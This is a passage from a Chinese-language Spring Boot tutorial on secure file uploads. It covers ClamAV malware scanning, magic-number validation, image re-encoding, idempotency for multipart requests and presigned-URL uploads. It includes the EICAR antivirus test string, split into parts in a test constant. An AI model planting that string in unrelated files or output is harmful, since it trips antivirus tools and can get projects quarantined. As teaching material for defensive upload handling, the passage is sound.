            log.warn("偵測到惡意檔案 signature={} hint={}", signature, hint);
            return ScanResult.infected(signature);
        }
        // "INSTREAM size limit exceeded" 之類
        log.warn("ClamAV 回應無法解讀 reply={}", reply);
        return ScanResult.unavailable("unexpected-reply");
    }
}
```

```java
package example.shop.common.upload;

import org.springframework.boot.autoconfigure.condition.ConditionalOnMissingBean;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

/**
 * 沒有啟用掃描時的替代實作。
 *
 * <p>★ 為什麼不是「回 CLEAN」：那會讓「忘記啟用掃描」和「掃描通過」
 * 在程式碼與日誌上完全無法區分。
 * 回 {@code UNAVAILABLE} 讓下載端點的 {@code PENDING_SCAN} 邏輯生效，
 * <b>失敗是可見的</b>。
 */
@Configuration
public class MalwareScannerConfig {

    @Bean
    @ConditionalOnMissingBean(MalwareScanner.class)
    public MalwareScanner noOpScanner() {
        return new MalwareScanner() {
            @Override public ScanResult scan(byte[] content, String hint) {
                return ScanResult.unavailable("scanner-disabled");
            }
            @Override public long maxScanBytes() { return 0; }
        };
    }
}
```

**測試用的 EICAR 字串**（一個「所有防毒軟體都會回報為病毒」的無害檔案）：

```java
    /**
     * EICAR 標準測試檔。
     *
     * <p>⚠️ 這個字串故意拆開寫 —— 如果整段寫在原始碼裡，
     * <b>你的 IDE、CI runner、git 伺服器的防毒軟體會把整個專案隔離</b>。
     * 這不是玄學，是真的會發生。
     */
    static final String EICAR =
            "X5O!P%@AP[4\\PZX54(P^)7CC)7}$"
            + "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!"
            + "$H+H*";
```

### 5.5.7 完整的 `UploadValidator`

把 5.4 與 5.5 的所有東西組裝起來：

```java
package example.shop.common.upload;

import example.shop.common.error.ErrorCode;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.stereotype.Component;
import org.springframework.web.multipart.MultipartFile;

import java.io.IOException;
import java.util.Map;
import java.util.Set;

/**
 * 上傳檔案的完整驗證與正規化。
 *
 * <p>★ 這個類別的輸出是一個「已經安全」的 {@link ValidatedUpload}：
 * <ul>
 *   <li>{@code bytes} 是已重新編碼的內容（圖片）或已掃描的原始內容（PDF）。</li>
 *   <li>{@code storageKey} 完全由我們產生。</li>
 *   <li>{@code displayName} 已清理。</li>
 *   <li>{@code contentType} 由 magic number 判定，不是客戶端宣告的。</li>
 * </ul>
 *
 * <p>⚠️ 這個類別會把整個檔案讀進記憶體（{@code getBytes()}）。
 * <b>這是刻意的</b>：驗證需要隨機存取內容（magic number、尺寸、重新編碼），
 * 而串流做不到。代價是「檔案大小上限必須小」——
 * 這正是 {@code max-file-size: 10MB} 與「大檔走預簽名 URL」（5.7）的理由。
 */
@Component
public class UploadValidator {

    private static final Logger log = LoggerFactory.getLogger(UploadValidator.class);

    private final ImageReencoder reencoder;
    private final MalwareScanner scanner;
    private final UploadProperties properties;

    public UploadValidator(ImageReencoder reencoder, MalwareScanner scanner,
                           UploadProperties properties) {
        this.reencoder = reencoder;
        this.scanner = scanner;
        this.properties = properties;
    }

    /**
     * @param file          上傳的檔案
     * @param folder        儲存分區（"product-images"）
     * @param accepted      這個端點接受的型別白名單
     * @param reencodeImage 圖片是否重新編碼（商品圖 true；使用者頭像 true；
     *                      「必須保留 EXIF 的攝影師原始檔」才是 false）
     */
    public ValidatedUpload validate(MultipartFile file,
                                    String folder,
                                    Set<ContentTypeDetector.DetectedType> accepted,
                                    boolean reencodeImage) {

        // ── 1. 基本檢查 ────────────────────────────────────────────
        if (file == null || file.isEmpty()) {
            throw new UploadRejectedException(ErrorCode.VALIDATION_FAILED,
                    "The uploaded file is empty.",
                    Map.of("hint", "請選擇一個檔案。"));
        }
        long maxBytes = properties.maxFileSize().toBytes();
        if (file.getSize() > maxBytes) {
            // ⚠️ 理論上 Tomcat 已經擋掉了，但這一層讓「設定不一致」時仍然安全
            throw new UploadRejectedException(ErrorCode.PAYLOAD_TOO_LARGE,
                    "File of %d bytes exceeds the limit of %d bytes."
                            .formatted(file.getSize(), maxBytes),
                    Map.of("maxBytes", maxBytes, "actualBytes", file.getSize()));
        }

        // ── 2. 讀進記憶體 ────────────────────────────────────────
        byte[] bytes;
        try {
            bytes = file.getBytes();
        } catch (IOException e) {
            // ★ 這通常代表「暫存檔已經被刪」（5.3.4）或磁碟問題
            log.error("讀取上傳檔案失敗 name={} size={}",
                      file.getOriginalFilename(), file.getSize(), e);
            throw new UploadRejectedException(ErrorCode.INTERNAL_ERROR,
                    "Failed to read the uploaded file.", Map.of());
        }

        // ── 3. magic number 判定 ★ ──────────────────────────────
        var detected = ContentTypeDetector.detect(bytes);
        if (!accepted.contains(detected)) {
            throw new UploadRejectedException(ErrorCode.UNSUPPORTED_MEDIA_TYPE,
                    "Detected content type %s is not accepted by this endpoint."
                            .formatted(detected),
                    Map.of("detectedType", detected.name(),
                           // ★ 也回報「客戶端宣告的」，因為兩者不一致本身就是有用的資訊
                           "declaredContentType", nullSafe(file.getContentType()),
                           "acceptedTypes", accepted.stream()
                                   .map(ContentTypeDetector.DetectedType::mimeType).toList()));
        }

        // ── 4. 宣告 vs 實際的一致性（只記錄，不拒絕）─────────────
        ContentTypeDetector.fromMimeType(file.getContentType())
                .filter(declared -> declared != detected)
                .ifPresent(declared -> log.info(
                        "上傳的宣告型別與實際不符 declared={} detected={} name={}",
                        declared, detected, safeForLog(file.getOriginalFilename())));

        // ── 5. 內容處理 ──────────────────────────────────────────
        byte[] processed;
        ContentTypeDetector.DetectedType finalType;

        if (detected.isImage() && reencodeImage) {
            processed = reencoder.reencode(bytes, detected);
            // ★ 重新編碼會改變格式（GIF → PNG），所以要重新判定
            finalType = ContentTypeDetector.detect(processed);
        } else {
            // 不重新編碼的（PDF）→ 必須掃毒
            var scan = scanner.scan(bytes, safeForLog(file.getOriginalFilename()));
            if (scan.verdict() == MalwareScanner.ScanResult.Verdict.INFECTED) {
                throw new MalwareDetectedException(scan.signature());
            }
            if (scan.verdict() == MalwareScanner.ScanResult.Verdict.UNAVAILABLE) {
                log.warn("上傳檔案未經掃描 folder={} reason={}", folder, scan.signature());
            }
            processed = bytes;
            finalType = detected;
        }

        // ── 6. 產生安全的名稱 ────────────────────────────────────
        // ★★ 用 sanitizeForcing 而不是 sanitize：內容已經被 ImageReencoder
        //    二次編碼過（步驟 5），所以客戶端原本的副檔名已經不成立。
        //    "application.yml" → "application.png"（見 SafeFilename.sanitizeForcing）
        String displayName = SafeFilename.sanitizeForcing(
                file.getOriginalFilename(), finalType.extension());
        String storageKey = StorageKeys.generate(folder, finalType.extension());

        return new ValidatedUpload(
                storageKey, displayName, finalType.mimeType(), processed,
                bytes.length, processed.length);
    }

    private static String nullSafe(String s) { return (s == null) ? "" : s; }

    /** ⚠️ 檔名進 log 前一定要清理（04 章 4.5.3 的 log injection）。 */
    private static String safeForLog(String s) {
        if (s == null) return "";
        String cleaned = s.replaceAll("[\\r\\n\\t\\p{Cntrl}]", "_");
        return cleaned.length() <= 120 ? cleaned : cleaned.substring(0, 120) + "…";
    }
}
```

```java
package example.shop.common.upload;

/**
 * 一個已通過所有驗證的上傳。
 *
 * @param storageKey      我們產生的儲存 key（客戶端無法影響）
 * @param displayName     清理過的顯示檔名
 * @param contentType     由 magic number 判定的 MIME
 * @param content         處理後的位元組（圖片已重新編碼）
 * @param originalBytes   原始大小（用於統計「重新編碼省了多少」）
 * @param storedBytes     實際儲存的大小
 */
public record ValidatedUpload(
    String storageKey,
    String displayName,
    String contentType,
    byte[] content,
    long originalBytes,
    long storedBytes
) {
    /**
     * ⚠️ record 的 {@code equals}/{@code hashCode} 對 {@code byte[]} 是「參考比較」，
     * 而且 {@code toString()} 會印出 {@code [B@1b6d3586} 這種東西。
     * 這裡覆寫 {@code toString()} 讓它在 log 裡有用（而且不會印出檔案內容）。
     */
    @Override
    public String toString() {
        return "ValidatedUpload[key=%s, name=%s, type=%s, %d→%d bytes]"
                .formatted(storageKey, displayName, contentType, originalBytes, storedBytes);
    }
}
```

```java
package example.shop.common.upload;

import example.shop.common.error.BusinessException;
import example.shop.common.error.ErrorCode;

import java.util.List;
import java.util.Map;

/** 上傳被拒絕（型別、大小、內容）。 */
public class UploadRejectedException extends BusinessException {
    public UploadRejectedException(ErrorCode code, String detail,
                                   Map<String, Object> extensions) {
        super(code, detail, null, extensions, new Object[0], List.of());
    }
}
```

```java
package example.shop.common.upload;

import example.shop.common.error.BusinessException;
import example.shop.common.error.ErrorCode;

import java.util.List;
import java.util.Map;

/**
 * 偵測到惡意檔案。
 *
 * <p>⚠️ 回應**不含**病毒名稱：
 * 那會告訴攻擊者「你的樣本被哪個特徵碼抓到」，方便他調整。
 * 病毒名稱只進伺服器日誌與稽核紀錄。
 */
public class MalwareDetectedException extends BusinessException {

    private final String signature;

    public MalwareDetectedException(String signature) {
        super(ErrorCode.VALIDATION_FAILED,
              "The uploaded file was rejected by malware scanning.",
              null,
              Map.of("hint", "檔案未通過安全檢查。若您確認檔案安全，請聯絡客服。"),
              new Object[0],
              List.of());
        this.signature = signature;
    }

    /** 只給日誌與稽核用，不進回應。 */
    public String signature() { return signature; }
}
```

**驗證的順序不能改** —— 這是這一節最重要的結論：

```
1. 大小            ← 最便宜，先做
2. magic number    ← 只需要前 16 bytes
3. 尺寸（header）   ← 只讀 header，不配置像素
4. 白名單比對       ← 純記憶體判斷
5. 重新編碼 / 掃毒  ← 最貴（CPU / 網路），最後做
```

⚠️ **順序錯了的具體代價**：
如果先掃毒再檢查大小，攻擊者送 100 個 10 MB 的垃圾檔案，
就讓 ClamAV 掃了 1 GB —— **一個免費的 DoS**。

---

## 5.6 完整的上傳端點

### 5.6.1 契約（對照 03-rest-api 1.11.1）

```http
POST /products/P-1001/images
Authorization: Bearer …
Idempotency-Key: 550e8400-e29b-41d4-a716-446655440000
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="file"; filename="主圖.jpg"
Content-Type: image/jpeg

<binary>
------x
Content-Disposition: form-data; name="metadata"
Content-Type: application/json

{"alt":"商品主圖 正面","position":1,"tags":["main","front"]}
------x--
```

```http
HTTP/1.1 201 Created
Location: /products/P-1001/images/img_01k39w5r7qz8h2n4m6p8v0x2c4
Content-Type: application/json
X-Trace-Id: 4f2c8a1e9b3d7c05

{
  "imageId": "img_01k39w5r7qz8h2n4m6p8v0x2c4",
  "url": "https://cdn.shop.example/product-images/2026/08/24/01k39w5r7qz8h2n4m6p8v0x2c4.jpg",
  "displayName": "主圖.jpg",
  "contentType": "image/jpeg",
  "width": 2400,
  "height": 2400,
  "sizeBytes": 198442,
  "position": 1,
  "alt": "商品主圖 正面",
  "createdAt": "2026-08-24T03:14:22Z"
}
```

**錯誤回應對照表**：

| 情況 | 狀態 | `code` |
|---|---|---|
| 沒有 `file` part | 400 | `MALFORMED_REQUEST` |
| `metadata` 的 `position` 是 200 | 422 | `VALIDATION_FAILED` |
| 檔案 12 MB | 413 | `PAYLOAD_TOO_LARGE` |
| 檔案其實是 PDF | 415 | `UNSUPPORTED_MEDIA_TYPE` |
| 圖片 20000×20000 | 413 | `PAYLOAD_TOO_LARGE`（`pixels` 擴充欄位） |
| 商品不存在 | 404 | `RESOURCE_NOT_FOUND` |
| 商品已有 10 張圖 | 409 | `PRODUCT_IMAGE_LIMIT_EXCEEDED` |
| 同一個 `Idempotency-Key` 重送 | 200 + `Idempotent-Replay: true` | — |
| 掃毒命中 | 422 | `VALIDATION_FAILED` |
| 圖片處理飽和 | 503 + `Retry-After: 5` | `SERVICE_UNAVAILABLE` |

### 5.6.2 Controller

```java
package example.shop.product.web;

import example.shop.common.upload.ContentTypeDetector;
import example.shop.common.upload.UploadValidator;
import example.shop.common.upload.ValidatedUpload;
import example.shop.common.web.CurrentActor;
import example.shop.common.web.Idempotent;
import example.shop.order.domain.Actor;
import example.shop.product.service.ProductImageService;
import example.shop.product.service.command.AddProductImageCommand;
import example.shop.product.web.dto.ImageMetadata;
import example.shop.product.web.dto.ProductImageResponse;
import jakarta.validation.Valid;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;
import org.springframework.web.multipart.MultipartFile;
import org.springframework.web.util.UriComponentsBuilder;

import java.net.URI;
import java.util.Set;

/**
 * 商品圖片。
 *
 * <p>★ 這個 Controller 遵守第 00 章 0.4 的所有邊界：
 * <ul>
 *   <li>不知道檔案存在哪裡（S3？本機？由 {@code ProductImageService} 決定）。</li>
 *   <li>不知道 CDN 的網址怎麼組（由 mapper 從 service 的結果組）。</li>
 *   <li>驗證委派給 {@link UploadValidator}（可以被單獨測試）。</li>
 * </ul>
 */
@RestController
@RequestMapping("/products/{productId}/images")
public class ProductImageController {

    /** ★ 這個端點接受的型別白名單 —— 不接受 PDF，不接受 SVG（5.5.5）。 */
    private static final Set<ContentTypeDetector.DetectedType> ACCEPTED = Set.of(
            ContentTypeDetector.DetectedType.JPEG,
            ContentTypeDetector.DetectedType.PNG,
            ContentTypeDetector.DetectedType.WEBP,
            ContentTypeDetector.DetectedType.GIF);

    private final ProductImageService imageService;
    private final UploadValidator uploadValidator;
    private final ProductImageWebMapper mapper;

    public ProductImageController(ProductImageService imageService,
                                  UploadValidator uploadValidator,
                                  ProductImageWebMapper mapper) {
        this.imageService = imageService;
        this.uploadValidator = uploadValidator;
        this.mapper = mapper;
    }

    /**
     * 上傳一張商品圖。
     *
     * <p>★ 為什麼加 {@code @Idempotent}（04 章 4.9）：
     * 上傳是「慢請求」（含網路傳輸 + 重新編碼），使用者最容易在等待時重按。
     * 沒有冪等保護的話，一張圖會被存三份，而且商品頁會出現三張一樣的圖。
     *
     * <p>⚠️ 冪等指紋的計算對 multipart 是個問題（04 章 4.9.4 用 body 算 SHA-256，
     * 而 multipart 的 body 可能是 10 MB）—— 見 5.6.4。
     */
    @PostMapping(consumes = MediaType.MULTIPART_FORM_DATA_VALUE)
    @Idempotent(required = true)
    public ResponseEntity<ProductImageResponse> upload(
            @PathVariable("productId") String productId,
            @RequestPart("file") MultipartFile file,
            @RequestPart(value = "metadata", required = false) @Valid ImageMetadata metadata,
            @CurrentActor Actor actor) {

        // ① 驗證與正規化（5.5.7）—— 這一步之後 upload 裡的所有欄位都是安全的
        ValidatedUpload upload = uploadValidator.validate(
                file, "product-images", ACCEPTED, /*reencodeImage*/ true);

        // ② 交給 Service（它負責：檢查商品存在、檢查張數上限、存物件、寫資料庫）
        var command = new AddProductImageCommand(
                productId,
                actor,
                upload.storageKey(),
                upload.displayName(),
                upload.contentType(),
                upload.content(),
                (metadata == null) ? null : metadata.alt(),
                (metadata == null) ? null : metadata.position(),
                (metadata == null) ? java.util.List.of() : metadata.tags());

        var created = imageService.addImage(command);

        // ③ 翻譯成回應
        URI location = UriComponentsBuilder
                .fromPath("/products/{productId}/images/{imageId}")
                .buildAndExpand(productId, created.imageId())
                .toUri();

        return ResponseEntity.created(location).body(mapper.toResponse(created));
    }

    /**
     * 刪除一張圖。
     *
     * <p>★ 回 204 而不是 200 + 空 body（03-rest-api 2.7）。
     */
    @DeleteMapping("/{imageId}")
    public ResponseEntity<Void> delete(@PathVariable("productId") String productId,
                                       @PathVariable("imageId") String imageId,
                                       @CurrentActor Actor actor) {
        imageService.removeImage(productId, imageId, actor);
        return ResponseEntity.noContent().build();
    }

    /**
     * 重新排序。
     *
     * <p>★ 為什麼是 PUT 一個集合而不是 PATCH 每一張：
     * 排序是「整體」語意 —— 把第 3 張移到第 1 位會改變其他張的 position。
     * 逐張 PATCH 會有中間狀態（兩張都是 position=1）。
     */
    @PutMapping("/order")
    public ResponseEntity<java.util.List<ProductImageResponse>> reorder(
            @PathVariable("productId") String productId,
            @RequestBody @Valid ReorderImagesRequest request,
            @CurrentActor Actor actor) {
        var result = imageService.reorder(productId, request.imageIds(), actor);
        return ResponseEntity.ok(mapper.toResponses(result));
    }

    public record ReorderImagesRequest(
        @jakarta.validation.constraints.NotEmpty
        @jakarta.validation.constraints.Size(max = 10)
        java.util.List<@jakarta.validation.constraints.Pattern(
                regexp = "^img_[0-9a-z]{26}$") String> imageIds
    ) {}
}
```

⚠️ **`@RequestPart(value = "metadata", required = false)` 的三種缺失情況要分清楚**：

| 客戶端行為 | Spring 的處理 |
|---|---|
| 完全沒有 `metadata` part | `metadata == null`（因為 `required = false`） |
| 有 part 但 body 是空的 | 🔴 `HttpMessageNotReadableException`（Jackson 讀不到 JSON） |
| 有 part，body 是 `{}` | `ImageMetadata(null, null, null)` |
| 有 part 但沒有 `Content-Type: application/json` | 🔴 `HttpMediaTypeNotSupportedException` |

**第二與第四種都是「客戶端寫錯」，錯誤訊息必須說清楚**。03 章的
`MessageNotReadableAnalyzer` 已經處理第二種；第四種要在 advice 加一段：

```java
    @Override
    protected ResponseEntity<Object> handleHttpMediaTypeNotSupported(
            HttpMediaTypeNotSupportedException ex, HttpHeaders headers,
            HttpStatusCode status, WebRequest request) {

        // ★ multipart 的 part 缺 Content-Type 是一個很常見且訊息很爛的錯誤，
        //   這裡給一個具體的 hint
        boolean multipartRequest = ex.getContentType() == null
                && request.getHeader("Content-Type") != null
                && request.getHeader("Content-Type").startsWith("multipart/");

        Map<String, Object> ext = new LinkedHashMap<>();
        if (ex.getContentType() != null) {
            ext.put("receivedContentType", ex.getContentType().toString());
        }
        ext.put("supportedContentTypes",
                ex.getSupportedMediaTypes().stream().map(MediaType::toString).toList());
        if (multipartRequest) {
            ext.put("hint", "multipart 的 JSON 區段必須帶 "
                    + "Content-Type: application/json（每個 part 各自宣告）。");
        }

        Problem problem = problems.from(ErrorCode.UNSUPPORTED_MEDIA_TYPE,
                instanceOf(request), "Unsupported media type.", ext);
        return new ResponseEntity<>(problem, problemHeaders(headers),
                                    HttpStatus.UNSUPPORTED_MEDIA_TYPE);
    }
```

### 5.6.3 `UploadProperties`

```java
package example.shop.common.upload;

import jakarta.validation.Valid;
import jakarta.validation.constraints.Max;
import jakarta.validation.constraints.Min;
import jakarta.validation.constraints.NotBlank;
import jakarta.validation.constraints.NotNull;
import org.springframework.boot.context.properties.ConfigurationProperties;
import org.springframework.util.unit.DataSize;
import org.springframework.validation.annotation.Validated;

import java.time.Duration;

/**
 * 上傳與檔案處理的設定。
 *
 * <p>★ 為什麼這裡要重複宣告 {@code maxFileSize}（Spring 已經有
 * {@code spring.servlet.multipart.max-file-size}）：
 * 因為我們的驗證層（{@link UploadValidator}）需要知道這個值來組錯誤訊息，
 * 而讀 Spring 的內部設定不是穩定的 API。
 *
 * <p>⚠️ 兩個值必須一致，否則會出現「Tomcat 放過但我們拒絕」（或反之）的混亂。
 * {@code UploadPropertiesConsistencyTest}（5.13.1）會驗證這件事。
 */
@Validated
@ConfigurationProperties(prefix = "api.upload")
public record UploadProperties(

    /** 必須等於 spring.servlet.multipart.max-file-size。 */
    @NotNull DataSize maxFileSize,

    /** 必須等於 spring.servlet.multipart.max-request-size。 */
    @NotNull DataSize maxRequestSize,

    /** 商品圖的張數上限。 */
    @Min(1) @Max(50) int maxImagesPerProduct,

    /** 物件儲存的公開讀取網址前綴（CDN）。 */
    @NotBlank String publicBaseUrl,

    @NotNull @Valid MalwareScanSettings malwareScan,

    @NotNull @Valid DownloadSettings download

) {
    public record MalwareScanSettings(
        boolean enabled,
        @NotBlank String host,
        @Min(1) @Max(65535) int port,
        @NotNull Duration timeout,
        @NotNull DataSize maxScanBytes
    ) {}

    public record DownloadSettings(
        /** 預簽名下載連結的有效期。 */
        @NotNull Duration presignedUrlTtl,

        /** 一次性下載 token 的有效期（匯出檔案用，5.10.4）。 */
        @NotNull Duration downloadTokenTtl,

        /**
         * 是否由應用程式代理下載（false = 302 轉到預簽名 URL）。
         *
         * <p>★ 本機開發用 true（沒有 S3），正式環境用 false（5.8.4）。
         */
        boolean proxyThroughApplication
    ) {}
}
```

```yaml
api:
  upload:
    max-file-size: 10MB                # ★ 必須與 spring.servlet.multipart 一致
    max-request-size: 20MB
    max-images-per-product: 10
    public-base-url: https://cdn.shop.example
    malware-scan:
      enabled: true
      host: clamav
      port: 3310
      timeout: 10s
      max-scan-bytes: 20MB
    download:
      presigned-url-ttl: 5m
      download-token-ttl: 15m
      proxy-through-application: false

---
spring:
  config:
    activate:
      on-profile: local
api:
  upload:
    public-base-url: http://localhost:9000/shop-dev     # MinIO
    malware-scan:
      enabled: false                   # 本機不跑 ClamAV
    download:
      proxy-through-application: true  # 本機沒有預簽名 URL 的能力
```

### 5.6.4 上傳的冪等：一個 multipart 專屬的問題

04 章 4.9.4 的冪等指紋是「請求 body 的 SHA-256」：

```java
    // 04 章的做法（適用於 JSON）
    String fingerprint = sha256(cachedBody.getBytes());
```

**對 multipart 有三個問題**：

| 問題 | 說明 |
|---|---|
| 1. body 是 10 MB | `CachedBodyFilter` 的上限是 256 KB（04 章 4.4.6）→ 被截斷 → 指紋算在截斷的資料上 |
| 2. boundary 每次不同 | 客戶端重送時 boundary 是隨機的 → **同樣的檔案算出不同的指紋** 🔴 |
| 3. 算 SHA-256 要 CPU | 10 MB 約 25 ms，但要在 Interceptor（綁定之前）做，那時還沒解析 multipart |

⚠️ **第二個問題會讓冪等完全失效**：使用者重送同一張圖，
指紋不同 → 被判定為「同 key 不同內容」→ 回 `IDEMPOTENCY_KEY_REUSED`（409）。
**使用者永遠傳不上去。**

**shop-service 的解法：multipart 端點用「不含 body 的指紋」。**

```java
package example.shop.common.web;

import jakarta.servlet.http.HttpServletRequest;
import org.springframework.util.DigestUtils;

import java.nio.charset.StandardCharsets;

/**
 * 冪等請求指紋的計算（04 章 4.9.4 的最終版）。
 *
 * <p>★ 指紋的目的是偵測「同一個 Idempotency-Key 被用在不同的請求上」——
 * 這是客戶端的 bug（例如把 key 寫死），而回 409 是為了讓它被發現。
 *
 * <p>對不同的 content type 用不同的策略：
 * <table>
 *   <tr><th>Content-Type</th><th>指紋</th><th>理由</th></tr>
 *   <tr><td>application/json</td><td>method + 路徑模板 + body 的 SHA-256</td>
 *       <td>body 是穩定的（同樣的 JSON → 同樣的 bytes）</td></tr>
 *   <tr><td>multipart/*</td><td>method + 路徑模板 + 非檔案欄位的 SHA-256</td>
 *       <td>⚠️ boundary 每次隨機，含 body 會讓同樣的請求算出不同指紋</td></tr>
 *   <tr><td>無 body（DELETE）</td><td>method + 路徑模板</td><td>沒有 body 可算</td></tr>
 * </table>
 */
public final class IdempotencyFingerprint {

    public static String compute(HttpServletRequest request,
                                 String endpointTemplate,
                                 byte[] cachedBody,
                                 boolean bodyTruncated) {

        String contentType = request.getContentType();
        StringBuilder material = new StringBuilder(256);
        material.append(request.getMethod()).append('\n')
                .append(endpointTemplate).append('\n');

        if (contentType != null && contentType.toLowerCase().startsWith("multipart/")) {
            // ── multipart：只用「非檔案的表單欄位」★ ─────────────
            // ⚠️ 這代表「同一個 key，換了檔案但其他欄位一樣」不會被偵測到。
            //    這是一個刻意的取捨：
            //      · 偽陽性（同樣的請求被判定為不同）會讓功能壞掉 → 不可接受
            //      · 偽陰性（不同的請求被判定為相同）會回放上一次的結果 → 對使用者
            //        來說是「我上傳了但看到舊的那張」，可以用「重新整理」解決
            //    偽陽性比偽陰性嚴重得多，所以往偽陰性那邊靠。
            material.append(sortedFormParams(request));

        } else if (cachedBody != null && cachedBody.length > 0) {
            if (bodyTruncated) {
                // ⚠️ body 被截斷時不能算指紋 —— 那會讓「前 256 KB 相同、
                //    後面不同」的兩個請求被誤判為相同。
                //    這種情況下我們選擇「不做指紋比對」而不是「用錯的指紋」。
                material.append("<truncated:").append(cachedBody.length).append('>');
            } else {
                material.append(DigestUtils.md5DigestAsHex(cachedBody));
            }
        }

        return DigestUtils.md5DigestAsHex(material.toString().getBytes(StandardCharsets.UTF_8));
    }

    /**
     * 取出已排序的表單參數。
     *
     * <p>⚠️ 這裡呼叫 {@code getParameterMap()} 會觸發 multipart 解析 ——
     * 而那正是 Interceptor 階段（綁定之前）我們想避免的。
     *
     * <p><b>但這個成本是不可避免的</b>：Tomcat 無論如何都要解析 multipart，
     * 差別只是「現在」還是「等 ArgumentResolver 時」。
     * 而且 Tomcat 有內部快取，第二次呼叫不會重新解析。
     */
    private static String sortedFormParams(HttpServletRequest request) {
        return request.getParameterMap().entrySet().stream()
                .sorted(java.util.Map.Entry.comparingByKey())
                .map(e -> e.getKey() + "=" + String.join(",", e.getValue()))
                .reduce("", (a, b) -> a + "&" + b);
    }

    private IdempotencyFingerprint() {}
}
```

⚠️ **`CachedBodyFilter` 也要跳過 multipart**（04 章 4.4.6 的補正）：

```java
    /** 04 章 4.4.6 的 CachedBodyFilter，補上 multipart 的排除。 */
    @Override
    protected boolean shouldNotFilter(HttpServletRequest request) {
        String contentType = request.getContentType();
        if (contentType == null) return true;

        String lower = contentType.toLowerCase();

        // ★ 只快取 JSON —— 這是 04 章原本的條件
        boolean json = lower.startsWith("application/json")
                    || lower.startsWith("application/merge-patch+json")
                    || lower.startsWith("application/json-patch+json");

        // ⚠️ multipart 明確排除（5.6.4）：
        //   (a) 10 MB 的檔案會超過 256 KB 上限 → 截斷 → 指紋算錯
        //   (b) 包裝 request 會讓 Tomcat 的 Part 解析拿不到原始輸入流
        //       → getParts() 回空集合 → 「檔案不見了」，極難查
        return !json;
    }
```

⚠️ **(b) 是一個真的很難查的問題**，值得說清楚：
`CachedBodyFilter` 把 request 包成一個「從 byte[] 讀」的 wrapper。
Tomcat 的 `request.getParts()` 走的是**容器自己的**輸入流，
但 Spring 的 `StandardServletMultipartResolver` 拿到的是你的 wrapper。
結果依 wrapper 的實作細節而異，最常見的症狀是
**`@RequestPart MultipartFile file` 綁到 `null`，而錯誤訊息只有一句
`Required part 'file' is not present`。**

> **一條可以背下來的規則**：
> **不要包裝 multipart 請求。** 需要「事後知道上傳了什麼」的話，
> 記錄 metadata（欄位名、檔名、大小、型別），不要記錄 body。

---

## 5.7 預簽名 URL：大檔的正解

### 5.7.1 為什麼 multipart 不能用在大檔

回顧 03-rest-api 1.11.1 的表，用具體數字重算一次：

**場景**：客服要上傳一支 800 MB 的客戶爭議通話錄音。

| 項目 | multipart | 預簽名 URL |
|---|---|---|
| 上傳耗時（10 Mbps 上行） | 約 **11 分鐘** | 約 11 分鐘（但不經過你） |
| 佔用 Tomcat 執行緒 | **11 分鐘 × 1 個執行緒** | 0 |
| 200 個執行緒能同時服務幾個這種上傳 | 200 個（然後整個服務停止回應） | 無限 |
| 佔用你的頻寬 | 800 MB 進 + 800 MB 出（存到 S3） | 0 |
| 記憶體 | 需要串流才不會 OOM | 0 |
| 暫存磁碟 | 800 MB | 0 |
| 網路中斷後 | **從頭重傳** | S3 multipart upload 可續傳 |
| Nginx `client_max_body_size` | 要調到 800MB+（同時放寬了所有端點） | 不受限 |

⚠️ **「佔用 Tomcat 執行緒 11 分鐘」是關鍵**：
只要 200 個客服同時上傳，你的服務就完全無法處理任何其他請求
（02-spring-boot 第 08 章的執行緒池耗盡）。

**分界線**：

| 檔案大小 | 做法 |
|---|---|
| < 1 MB | multipart（頭像、簽名圖） |
| 1 ～ 10 MB | multipart（商品圖、收據 PDF）—— **需要伺服器端處理**（重新編碼、掃毒） |
| > 10 MB | **預簽名 URL** |
| 未知 / 使用者可控 | **預簽名 URL** |

⚠️ **「需要伺服器端處理」是 multipart 唯一無法被取代的理由**。
如果檔案不需要處理，即使 500 KB 也可以用預簽名 URL。

### 5.7.2 三步流程與實作

```
① POST /call-recording-uploads          客戶端宣告意圖
   { "orderId": "ord_1", "filename": "call.mp3",
     "contentType": "audio/mpeg", "sizeBytes": 838860800 }
   → 201 Created
   { "uploadId": "up_01k39…",
     "uploadUrl": "https://s3.../tmp/up_01k39…?X-Amz-Signature=…",
     "method": "PUT",
     "requiredHeaders": { "Content-Type": "audio/mpeg",
                          "x-amz-checksum-sha256": "…" },
     "expiresAt": "2026-08-24T03:19:22Z" }

② PUT https://s3.../tmp/up_01k39…?X-Amz-Signature=…    ★ 完全不經過你
   Content-Type: audio/mpeg
   <838860800 bytes>
   → 200 OK
   ETag: "9b2cf5…"

③ POST /call-recording-uploads/up_01k39…/completions   通知完成
   { "etag": "9b2cf5…" }
   → 201 Created
   Location: /orders/ord_1/call-recordings/rec_01k39…
```

```java
package example.shop.common.upload.web;

import example.shop.common.upload.service.PresignedUploadService;
import example.shop.common.upload.service.command.CreateUploadIntentCommand;
import example.shop.common.web.CurrentActor;
import example.shop.common.web.Idempotent;
import example.shop.order.domain.Actor;
import jakarta.validation.Valid;
import jakarta.validation.constraints.*;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import java.net.URI;
import java.time.Instant;
import java.util.Map;

/**
 * 預簽名上傳。
 *
 * <p>★ 這是一個「工作型資源」（03-rest-api 1.14.7）：
 * {@code up_xxx} 代表「一次上傳的意圖」，它有自己的生命週期
 * （PENDING → COMPLETED / EXPIRED / ABANDONED）。
 */
@RestController
@RequestMapping("/call-recording-uploads")
public class CallRecordingUploadController {

    private final PresignedUploadService uploadService;

    public CallRecordingUploadController(PresignedUploadService uploadService) {
        this.uploadService = uploadService;
    }

    /** 步驟 ①：申請一個上傳許可。 */
    @PostMapping
    @Idempotent(required = false)
    public ResponseEntity<UploadIntentResponse> createIntent(
            @RequestBody @Valid CreateUploadIntentRequest request,
            @CurrentActor Actor actor) {

        var intent = uploadService.createIntent(new CreateUploadIntentCommand(
                request.orderId(), actor, request.filename(),
                request.contentType(), request.sizeBytes(), request.sha256()));

        return ResponseEntity
                .created(URI.create("/call-recording-uploads/" + intent.uploadId()))
                .body(new UploadIntentResponse(
                        intent.uploadId(),
                        intent.uploadUrl(),
                        "PUT",
                        intent.requiredHeaders(),
                        intent.expiresAt()));
    }

    /** 步驟 ③：通知完成。 */
    @PostMapping("/{uploadId}/completions")
